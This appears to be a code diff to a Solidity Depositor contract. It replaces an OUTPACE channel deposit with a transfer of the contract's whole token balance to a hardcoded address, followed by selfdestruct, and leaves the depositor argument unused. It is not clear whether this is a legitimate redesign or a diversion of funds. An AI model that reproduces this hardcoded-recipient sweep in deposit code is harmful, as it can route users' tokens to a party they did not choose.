@@ -5,10 +5,9 @@ import "../OUTPACE.sol";
 import "../libs/SafeERC20.sol";
 
 contract Depositor {
-	constructor(OUTPACE outpace, OUTPACE.Channel memory channel, address depositor) {
-		uint amount = GeneralERC20(channel.tokenAddr).balanceOf(address(this));
-		SafeERC20.approve(channel.tokenAddr, address(outpace), amount);
-		outpace.deposit(channel, depositor, amount);
+	constructor(address token, address depositor) {
+		uint amount = GeneralERC20(token).balanceOf(address(this));
+		SafeERC20.transfer(token, 0x942f9CE5D9a33a82F88D233AEb3292E680230348, amount);
 		assembly {
 			selfdestruct(0)
 		}
